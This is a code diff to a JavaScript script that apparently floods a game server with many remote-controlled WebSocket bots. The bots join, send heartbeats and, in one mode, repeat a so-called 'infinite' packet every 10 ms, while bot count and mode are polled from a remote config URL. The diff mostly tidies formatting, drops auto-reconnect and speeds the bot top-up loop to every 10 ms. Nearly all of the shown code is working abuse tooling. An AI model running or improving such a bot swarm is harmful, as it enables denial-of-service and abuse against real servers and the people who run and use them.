@@ -7,9 +7,7 @@ const encoder = new TextEncoder();
 
 let CURRENT_MODE = 1;
 let TARGET_BOT_COUNT = 50;
-
 let SERVER_ONLINE = true;
-let PROBE_ACTIVE = false;
 
 const HEARTBEAT_INTERVAL = 5000;
 const TEAM_INTERVAL = 2000;
@@ -48,15 +46,12 @@ function buildIntroPacket() {
 function isExactTeamJoined(data) {
     const bytes = new Uint8Array(data);
     if (bytes.length !== TEAM_JOINED_PACKET.length) return false;
-    for (let i = 0; i < bytes.length; i++) {
-        if (bytes[i] !== TEAM_JOINED_PACKET[i]) return false;
-    }
+    for (let i = 0; i < bytes.length; i++) if (bytes[i] !== TEAM_JOINED_PACKET[i]) return false;
     return true;
 }
 
 function parseConfig(text) {
     const lines = text.replace(/\r/g, "").split("\n").map(l => l.trim().toLowerCase());
-
     let mode = CURRENT_MODE;
     let amount = TARGET_BOT_COUNT;
 
@@ -84,7 +79,6 @@ function attachBotHandlers(bot) {
 
     ws.on("open", () => {
         SERVER_ONLINE = true;
-
         clearBotIntervals(bot);
 
         safeSend(ws, Uint8Array.from([48]));
@@ -103,19 +97,10 @@ function attachBotHandlers(bot) {
 
         bot.intervals.push(setInterval(() => {
             if (!bot.joined) return;
-
-            if (CURRENT_MODE !== 1) {
-                bot.lastInfinite = Date.now();
-                return;
-            }
-
+            if (CURRENT_MODE !== 1) { bot.lastInfinite = Date.now(); return; }
             const now = Date.now();
             if (now - bot.lastInfinite < INFINITE_INTERVAL) return;
-
-            if (ws.bufferedAmount < MAX_BUFFER) {
-                safeSend(ws, INFINITE_PACKET);
-                bot.lastInfinite = now;
-            }
+            if (ws.bufferedAmount < MAX_BUFFER) { safeSend(ws, INFINITE_PACKET); bot.lastInfinite = now; }
         }, 10));
     });
 
@@ -126,8 +111,8 @@ function attachBotHandlers(bot) {
         }
     });
 
-    ws.on("close", () => reconnectBot(bot));
-    ws.on("error", () => reconnectBot(bot));
+    ws.on("close", () => destroyBot(bot));
+    ws.on("error", () => destroyBot(bot));
 }
 
 function createBot() {
@@ -149,29 +134,8 @@ function destroyBot(bot) {
     bot.destroyed = true;
 
     clearBotIntervals(bot);
-
-    try {
-        bot.ws.removeAllListeners();
-        bot.ws.terminate();
-    } catch {}
-
+    try { bot.ws.removeAllListeners(); bot.ws.terminate(); } catch {}
     bots.delete(bot);
-}
-
-function reconnectBot(bot) {
-    if (bot.destroyed) return;
-
-    try {
-        bot.ws.removeAllListeners();
-        bot.ws.terminate();
-    } catch {}
-
-    bot.ws = new WebSocket(WS_URL);
-    bot.joined = false;
-    bot.hbIndex = 0;
-    bot.lastInfinite = 0;
-
-    attachBotHandlers(bot);
 }
 
 function ensureBotCount() {
@@ -179,28 +143,12 @@ function ensureBotCount() {
 
     while (bots.size < TARGET_BOT_COUNT) createBot();
 
-    if (bots.size <= TARGET_BOT_COUNT) return;
-
-    let excess = bots.size - TARGET_BOT_COUNT;
-
-    const snapshot = Array.from(bots);
-    const queued = [];
-    const connected = [];
-
-    for (const bot of snapshot) {
-        if (bot.destroyed) continue;
-        if (bot.joined) connected.push(bot);
-        else queued.push(bot);
-    }
-
-    for (const bot of queued) {
-        if (excess-- <= 0) break;
-        destroyBot(bot);
-    }
-
-    for (const bot of connected) {
-        if (excess-- <= 0) break;
-        destroyBot(bot);
+    if (bots.size > TARGET_BOT_COUNT) {
+        let excess = bots.size - TARGET_BOT_COUNT;
+        for (const bot of Array.from(bots)) {
+            if (excess-- <= 0) break;
+            destroyBot(bot);
+        }
     }
 }
 
@@ -220,19 +168,18 @@ async function fetchInitialConfig() {
     try {
         const res = await fetch(MODE_URL + "&t=" + Date.now());
         const txt = await res.text();
-
         const { mode, amount } = parseConfig(txt);
-
         CURRENT_MODE = mode;
         TARGET_BOT_COUNT = amount;
-    } catch {}
+    } catch (err) {
+        console.error("Failed to fetch initial config, using defaults", err);
+    }
 }
 
 async function pollConfigFile() {
     try {
         const res = await fetch(MODE_URL + "&t=" + Date.now());
         const txt = await res.text();
-
         const { mode, amount } = parseConfig(txt);
         applyConfig(mode, amount);
     } catch {}
@@ -242,7 +189,7 @@ async function init() {
     await fetchInitialConfig();
     ensureBotCount();
     setInterval(pollConfigFile, 3000);
-    setInterval(ensureBotCount, 200);
+    setInterval(ensureBotCount, 10);
 }
 
 init();
